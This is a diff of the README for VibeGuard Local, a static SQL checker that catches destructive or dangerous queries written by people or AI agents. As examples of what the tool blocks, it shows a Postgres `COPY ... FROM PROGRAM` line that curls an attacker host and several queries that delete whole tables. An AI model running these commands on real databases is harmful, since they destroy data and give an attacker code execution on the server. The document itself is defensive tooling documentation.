@@ -1,7 +1,13 @@
 # VibeGuard — Local
 
-> **AI agents are writing SQL against your production database. This catches the dangerous queries before they run.**
-> 36 checks. Sub-millisecond. Runs in your CLI, your editor, or right in your browser.
+> **AI agents are casually writing SQL that can nuke your entire production database.**
+>
+> Sometimes it's `DELETE FROM users` with no `WHERE`. Sometimes it's `DROP TABLE`. Sometimes it's `COPY users FROM PROGRAM 'curl http://attacker.com/x.sh'` — yes, that's a real Postgres feature, yes it executes shell commands on your database server, and no, your AI agent doesn't know that.
+>
+> **VibeGuard Local is the senior DBA review your AI doesn't know it needs.**
+
+**36 battle-tested safety checks. Sub-millisecond. 100% local.**
+Runs in your editor as you type, in CI before you merge, in the CLI before you migrate, or right in your browser before you install. Nothing ever leaves your machine.
 
 [![@vibeguard-dev/local](https://img.shields.io/npm/v/@vibeguard-dev/local?label=%40vibeguard-dev%2Flocal)](https://www.npmjs.com/package/@vibeguard-dev/local)
 [![eslint-plugin-vibeguard](https://img.shields.io/npm/v/eslint-plugin-vibeguard?label=eslint-plugin-vibeguard)](https://www.npmjs.com/package/eslint-plugin-vibeguard)
@@ -11,37 +17,21 @@
 
 ---
 
-## What it does
+## Try it right now → [muddysheep.github.io/vibeguard-local](https://muddysheep.github.io/vibeguard-local/)
 
-You write SQL — by hand, by template literal, or by AI agent. Before that SQL touches your database, VibeGuard reads it and flags 36 patterns that destroy data, leak data, or create security holes. The check runs locally in milliseconds. Nothing leaves your machine. There's a browser playground, a CLI for `.sql` files and CI, an ESLint plugin for `` sql`...` `` template literals, and a programmatic SDK if you want to wire it into something custom.
+Paste any query. Or click one of 36 ready-made samples — one per shipped check. Watch the analyzer catch what you didn't know was wrong.
 
----
-
-## Who this is for
-
-Three situations. If any apply, this is for you:
-
-- **You write SQL by hand.** Migrations, RPC bodies, ad-hoc fixes. One missing `WHERE` clause wipes a table at 11pm and you spend Saturday restoring from backup.
-- **You write SQL inside JavaScript or TypeScript.** Tagged template literals (`` sql`SELECT ...` ``) in postgres.js, Kysely, Drizzle's raw SQL escape, or any framework. Most ORM code is safe; the dangerous queries are the ones you wrote yourself in a tagged template and never linted.
-- **You let AI agents touch your database.** Cursor, Claude Code, Replit Agent, custom orchestrators. The agent confidently generates `DELETE FROM users` and you find out it ran when the support tickets start.
-
-If your entire workflow is structured query builders you never override (`.from().select().eq()` chains, ActiveRecord without `find_by_sql`), this isn't for you — those are already parameterized and safe by construction. The moment SQL gets written as text, by anyone or anything, that's when this kicks in.
-
----
-
-## Try it in your browser → [muddysheep.github.io/vibeguard-local](https://muddysheep.github.io/vibeguard-local/)
-
-Paste any SQL query, see what gets caught. Or click one of 36 ready-made samples — one per shipped check. Runs entirely in your browser via WASM. Your SQL never leaves the page.
+Runs entirely in your browser via WASM. Your SQL never leaves the page. No signup, no install, no telemetry.
 
 [![VibeGuard playground — dark theme](./docs/img/playground-dark.png)](https://muddysheep.github.io/vibeguard-local/)
 
 ---
 
-## Three queries that look fine and aren't
+## Three queries that look fine and absolutely aren't
 
 These are real query shapes that have caused real outages. Paste any of them into the playground and watch what happens.
 
-### 1. The "audit log makes it look bounded" trick
+### 1. The audit-log trick that still deletes everything
 
 ```sql
 WITH deleted_users AS (
@@ -53,8 +43,8 @@ SELECT id, 'purged' FROM deleted_users
 WHERE account_status = 0;
 ```
 
-**What it looks like:** we only purge inactive users — there's a `WHERE account_status = 0` right there.
-**What it actually does:** deletes every row in `users`. The `WHERE` is on the outer `SELECT`, not the `DELETE`. The audit log just *looks* clean because only the inactive users get logged.
+**Looks like:** "we only purge inactive users — there's a `WHERE account_status = 0` right there."
+**Actually does:** deletes every row in `users`. The `WHERE` is on the outer `SELECT`, not the `DELETE`. The audit log just *looks* clean because only the inactive users get logged. You won't notice until the support tickets start.
 **VibeGuard catches:** `SQL-003 (block, 97) — Unbounded DELETE statement.`
 
 ### 2. The `WHERE 1=1` placeholder that ships to production
@@ -63,8 +53,8 @@ WHERE account_status = 0;
 DELETE FROM users WHERE 1=1;
 ```
 
-**What it looks like:** scoped — there's a `WHERE` clause.
-**What it actually does:** deletes everything. AI agents leave `WHERE 1=1` as a placeholder they "intend to fill in later." Sometimes they don't.
+**Looks like:** scoped — there's a `WHERE` clause, the AI was being careful.
+**Actually does:** deletes everything. AI agents leave `WHERE 1=1` as a placeholder they "intend to fill in later." Sometimes they don't. Sometimes the human doesn't notice. Sometimes both.
 **VibeGuard catches:** `SQL-034 (block, 95) — literal tautology on DELETE.`
 
 ### 3. The Postgres feature that's also remote code execution
@@ -73,11 +63,44 @@ DELETE FROM users WHERE 1=1;
 COPY users FROM PROGRAM 'curl http://attacker.com/payload.csv';
 ```
 
-**What it looks like:** a normal `COPY` for loading data.
-**What it actually does:** runs `curl` (or any shell command) on the database server. If an AI agent has DB credentials and writes this, that's RCE on your Postgres host. This is documented Postgres behavior, not a vulnerability — and most people don't know it exists.
+**Looks like:** a normal `COPY` for loading data. The AI even commented it as "import users from CSV."
+**Actually does:** runs `curl` (or `rm -rf`, or anything) on the database server, as the postgres OS user. If your AI agent has DB credentials and writes this, that's RCE on your Postgres host. This is documented Postgres behavior, not a vulnerability — and almost nobody knows it exists until someone exploits it.
 **VibeGuard catches:** `SQL-016 (block, 99) — COPY ... FROM PROGRAM.`
 
 There are 33 more like these. The full list is below.
+
+---
+
+## Who this is for
+
+**You're shipping fast with AI and you're a little nervous about it.**
+Cursor's writing your migrations. Claude Code is generating RPCs. Replit Agent's been touching the database for two hours and you haven't been watching every query. You want a tripwire that fires *before* the agent's confidently-wrong SQL hits production. That's this.
+
+**You're a senior engineer and you read the three queries above and immediately knew which 2am incident each one represents.**
+You don't need convincing. You need a `npm install`, an ESLint rule, and a CI step. Skip to [Install](#install).
+
+**Specifically, this is for you if any of these are true:**
+
+- **You write SQL by hand.** Migrations, RPC bodies, ad-hoc fixes. One missing `WHERE` clause wipes a table at 11pm and you spend Saturday restoring from backup.
+- **You write SQL inside JavaScript or TypeScript.** Tagged template literals (`` sql`SELECT ...` ``) in postgres.js, Kysely, Drizzle's raw SQL escape, or any framework. Most ORM code is safe; the dangerous queries are the ones you wrote yourself in a tagged template and never linted.
+- **You let AI agents touch your database.** Cursor, Claude Code, Replit Agent, custom orchestrators. The agent confidently generates `DELETE FROM users` and you find out it ran when the support tickets start.
+
+**This is NOT for you if** your entire workflow is structured query builders you never override (`.from().select().eq()` chains, ActiveRecord without `find_by_sql`). Those are already parameterized and safe by construction. The moment SQL gets written as text, by anyone or anything — that's when this kicks in.
+
+---
+
+## What it does
+
+You write SQL — by hand, by template literal, or by AI agent.
+
+Before that SQL touches your database, VibeGuard reads it and flags 36 patterns that destroy data, leak data, or open security holes.
+
+The check runs **locally, in milliseconds**. Nothing leaves your machine. There are four ways to use it:
+
+- **Browser Playground** — try it instantly, no install, no signup
+- **CLI** — for `.sql` files, migrations, and CI pipelines
+- **ESLint Plugin** — real-time underlines in `` sql`...` `` tagged templates as you type
+- **SDK** — wire it into agents, custom dashboards, or whatever your workflow is
 
 ---
 
@@ -125,7 +148,7 @@ vg-local analyze 'src/**/*.sql' --fix         # apply autofixes for SQL-001 / 00
 vg-local analyze 'src/**/*.sql' --fix-dry-run # show what would change, don't write
 ```
 
-The exit-code-1-on-block behavior is what makes it CI-friendly: drop `vg-local analyze` into a GitHub Action, and PRs that introduce a block-severity catch fail the build.
+The exit-code-1-on-block behavior is what makes it CI-friendly: drop `vg-local analyze` into a GitHub Action, and PRs that introduce a block-severity catch fail the build. Your AI can keep generating SQL all day; the build just won't let the destructive shapes through.
 
 Full SDK and CLI reference: [`packages/sdk/README.md`](./packages/sdk/README.md).
 
@@ -234,15 +257,17 @@ V1.0 through V1.5 shipped 15 catches focused on **correctness footguns** — car
 
 ## What this is NOT
 
-This is **static analysis only**. It checks the *shape* of the SQL text. It does not:
+This is **static analysis only**. It checks the *shape* of the SQL text — what's written, before it runs. It does not:
 
-- compare an agent's stated intent against what its SQL would actually do
+- compare an agent's stated intent against what its SQL would actually do at runtime
 - estimate real blast radius from the upstream Postgres planner
-- provide tamper-evident audit logging
+- provide tamper-evident audit logging across every database operation
 - offer human-in-the-loop escalation for grey-zone queries
 - track per-agent behavioral baselines over time
 
-For those things, there's a **VibeGuard Cloud** product — the wire-protocol proxy and MCP server this repo is the static-analysis layer of. Different product, different scope. The two are designed to work together: the OSS in your editor and CI, the Cloud between your agents and your production database. This repo isn't a marketing surface for the Cloud product, but if you're wondering whether that gap exists, it does, and Cloud is what fills it.
+If you need any of those, there's a separate **VibeGuard Cloud** product — an MCP server (and, for self-hosters, a wire-protocol proxy) that sits between your AI agents and your production database at runtime. Different product, different scope. The two are designed to work together: the OSS in your editor and CI catches the dangerous shapes before they're committed; the Cloud catches what slips through, at the moment the agent tries to execute it.
+
+This repo isn't a marketing surface for the Cloud product. But if you read the list above and thought "I need that gap filled," that gap exists, and that's what fills it.
 
 ---
 
